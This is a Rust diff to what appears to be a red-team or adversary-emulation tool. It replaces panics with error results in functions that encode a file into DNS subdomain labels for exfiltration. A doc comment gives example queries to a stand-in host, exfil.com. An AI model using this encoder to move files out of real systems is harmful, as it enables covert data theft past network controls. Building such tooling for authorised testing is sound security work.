@@ -50,26 +50,30 @@ const MAX_LIMIT_PAYLOAD_SIZE: usize = 4 * (1024 * 1024); // 4 MB
 ///
 /// # Returns
 /// A vector of `Node` objects starting with a root node followed by file chunk nodes.
-/// All nodes are ready for encoding and DNS transmission.
+/// All nodes are ready for encoding and DNS transmission
 ///
-/// # Panics
-/// - If the domain name is too long to encode any payload safely
-/// - If the file size exceeds the 4 MB practical limit for DNS exfiltration
+/// # Errors
+/// - If the domain name is too long to encode any payload data.
+/// - If the file exceeds the 4 MB practical size limit for DNS exfiltration.
 fn split_file_dns_safe(
     root_node: RootNode,
     domain_length: usize,
     file_bytes: Vec<u8>,
-) -> Vec<Node> {
+) -> crate::error::Result<Vec<Node>> {
     let ref_root_identifier = std::rc::Rc::clone(&root_node.file_identifier);
     let decoded_length =
         (super::decoded_chunk_size(DOMAIN_LABEL_MAX_LENGTH) as f32 / 2.0).floor() as usize;
 
     if (domain_length + decoded_length) >= DOMAIN_NAME_MAX_LENGTH {
-        panic!("Domain name too long to safely encode any payload chunks.");
+        return Err(crate::error::RunnerError::validation_error(
+            "Domain name too long to encode any payload safely.",
+        ));
     }
 
     if file_bytes.len() > MAX_LIMIT_PAYLOAD_SIZE {
-        panic!("File size exceeds maximum limit for DNS exfiltration.");
+        return Err(crate::error::RunnerError::validation_error(
+            "File size exceeds maximum limit for DNS exfiltration.",
+        ));
     }
 
     let mut nodes: Vec<Node> = vec![Node::Root(root_node)];
@@ -111,7 +115,7 @@ fn split_file_dns_safe(
         }
     });
 
-    nodes
+    Ok(nodes)
 }
 
 /// Encodes a complete file for DNS exfiltration with multi-stage encoding and segmentation.
@@ -140,7 +144,7 @@ fn split_file_dns_safe(
 /// A vector of subdomain strings, each representing one DNS query's data payload. Each string
 /// contains dot-separated DNS labels, ready to be prefixed to the domain name for querying.
 ///
-/// # Panics
+/// # Errors
 /// - If the file cannot be read from the filesystem
 /// - If the domain name is too long to encode any payload data
 /// - If the file exceeds the 4 MB practical size limit for DNS exfiltration
@@ -149,13 +153,16 @@ fn split_file_dns_safe(
 /// If a 100-byte file is encoded, the result might be a vector like:
 /// `["aabbcc.ddeeff.gghh", "iijjkk.llmmnn.oopq"]` which would be queried as:
 /// `aabbcc.ddeeff.gghh.exfil.com` and `iijjkk.llmmnn.oopq.exfil.com`
-pub fn encode_payload_dns_safe(filepath: &PathBuf, domain_name: &str) -> Vec<String> {
-    let file_bytes = buffered_read_file(filepath);
-    let root_node = RootNode::try_from(filepath).unwrap();
-    let nodes = split_file_dns_safe(root_node, domain_name.len(), file_bytes);
+pub fn encode_payload_dns_safe(
+    filepath: &PathBuf,
+    domain_name: &str,
+) -> crate::error::Result<Vec<String>> {
+    let file_bytes = buffered_read_file(filepath)?;
+    let root_node = RootNode::try_from(filepath)?;
+    let nodes = split_file_dns_safe(root_node, domain_name.len(), file_bytes)?;
     let chunk_size = (DOMAIN_LABEL_MAX_LENGTH / 2) as usize;
 
-    nodes
+    Ok(nodes
         .iter()
         .map(|node| {
             crate::encoders::encode_b64_hex(node.to_string())
@@ -165,5 +172,5 @@ pub fn encode_payload_dns_safe(filepath: &PathBuf, domain_name: &str) -> Vec<Str
                 .collect::<Vec<&str>>()
                 .join(".")
         })
-        .collect()
+        .collect())
 }
